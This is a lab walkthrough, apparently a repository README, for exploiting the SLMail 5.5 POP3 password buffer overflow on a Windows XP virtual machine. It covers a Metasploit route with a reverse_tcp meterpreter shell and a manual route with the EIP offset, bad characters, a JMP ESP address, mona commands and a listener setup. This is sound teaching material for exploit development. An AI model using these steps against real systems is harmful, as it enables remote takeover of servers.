
# SLMail 5.5 buffer overflow

`Seattle Lab Mail 5.5 server` is vulnerable to an unauthenticated buffer overflow attack when receiving an excessively
long password. This vulnerability can be exploited in any version of Windows running the executable `SLmail.exe`.

I exploited this vulnerability in the `Windows XP SP3` environment using `Kali Linux version 2021`, using an automated
exploit with `Metasploit` and a manual step-by-step exploit with `Immunity Debugger`.

## Requirements

Download the vulnerable application from **Exploit-DB**

- > [SLMAIL v5.5]((https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe))

Download Immunity debbugger for manual exploitation
- > [Immunity debugger]( https://www.immunityinc.com/products/debugger/)

## TEST

### Environment:

- ***Attack host*** : Kali Linux 2021 VM
- ***Vulnerable application host***: Windows XP SP3 VM

### Steps:

#### Using Metasploit:
1. Start the service POP3 SLMail in the victim machine.
2. Open metasploit in Kali Linux
3. Use the exploit ***"exploit/windows/pop3/seattlelab_pass"***
4. Set the meterpreter ***"windows/meterpreter/reverse_tcp"***
5. Set the options as follows:
    1. *RHOSTS*: Remote vulnerable host IP -> WinXP machine
    2. *LHOST*: Local attacker machine -> Kali machine
    3. *LPORT*: 4444 or other free port
6. Exploit!
 
#### Manual exploitation
`VM IPs : @Kali : 192.168.1.20 | @Windows Xp : 192.168.1.10`

> IMPORTANT NOTE:  YOU HAVE TO RESTART THE SLMAIL APPLICATION AFTER EACH CRASH ! 

1. Start the service POP3 SLMail in the victim machine.![](/BOImages/sl.png)
2. Attach the application proccess to Immunity Debugger.![](/BOImages/2.png)![](/BOImages/3.png) 
3. To authenticate to the application you have to use the two commands `USER` and `PASS`. Try to crash the application by sending big buffer to the application. I used Python script for this purpose ![](/BOImages/13.png)
4. The application crashed! we can clearly see in Immunity Debugger that we were able to override the `EIP` ![](/BOImages/15.png)
5. The override of the value of `EIP` opens the possibility of `shell code` injection into the buffer. But before that, we need to calculate the number of bytes to inject before overwriting EIP. To do this, you can use `pattern_create.rb` script located in ***/usr/share/metasploit-framework/tools/exploit***. ![](/BOImages/18.png)
6. Replace the buffer sent by the generated the pattern. Inspect the new value of `EIP` in Immunity then calculate the offset for the crash using the script `pattern_offset.rb` located in ***/usr/share/metasploit-framework/tools/exploit*** ![](/BOImages/23.png)![](/BOImages/24.png).
7. `4654` charcters to overwrite the value of `EIP`. Let's test it: ![](/BOImages/25.png) ![](/BOImages/27.png)   
8. Now let's see if the application is sensitive to bad charcters. Generate a set of all possible charcters then send them over to the application as follows:
![](/BOImages/28.png) ![](/BOImages/29.png) 
9. Locate the set of characters in memory and try to find the characters that break the orders.![](/BOImages/32.png)
10. You can see that `x\00` is missing after the character B `\x42`. Also `\x0a` after `\x09`,  `\x0D` after `\x0C`. The final result of bad characters is the set `\x00\x0a\x0d\`. The shell to inject must not have this characters
11. To generate a `shell` use `MSFVENOM` tool as follows (Replace LHOST with your attack machine): ![](/BOImages/38.png)
12. The generated `shell` code needs some adjustements. If you try to use it for exploitation you will fail due to `Memory access Protection`. After injection, the beginning of the `shell` code is located in SP, so we have to find a `.dll` module that contains a `JMP ESP` command to redirect the program's execution to our Shell code (the address of this command needs to be located and then injected it into `EIP` by modifying the exploit script). For this purpose, we can use [Mona.py](https://github.com/corelan/mona), a library designed for Immunity debugger that accelerates the advanced researchs in memory for a specific program.
> Add `mona.py` to **Pycommands** folder of your Immunity debugger
13. use `!mona modules` command to list the `.dll` modules used by the program. Try to locate a module that: 
    * Has `JMP ESP` command 
    * Free from memory protections like `ASLR` , `SAFESEH`.
    ![](/BOImages/47.png)
    * Jump ESP in memory is `FFE4`.
    ![](/BOImages/48.png)
    ![](/BOImages/49.png) 
14. For this example, I selected `slmfc.dll` module. Use the command `!mona find -s "\xff\xe4" -m slmfc.dll` to locate an address of JMP ESP instruction in selected module
    ![](/BOImages/51.png) 
15. For this example I picked the address `5F4A358F`. This address needs to be injected in EIP so we the flow of the execution of the program can be redirect to the `shell code` located in `ESP` (After fuzzing). The address must be typed in Little Endian format in the script. (I add some No Operation `NOP` instructions to the buffer just before I send it) ![](/BOImages/52.png)
16. Open a multi handler listner using metasploit and use reverse tcp payload for staging as follows: ![](/BOImages/53.png)
17. Execute the python script '**slmail.py**' using the following syntax `./slmail.py @victim_machine`
    > Note: @victim_machine needs to be replaced by the real victim machine address
18. Exploit!
![](/BOImages/54.png)
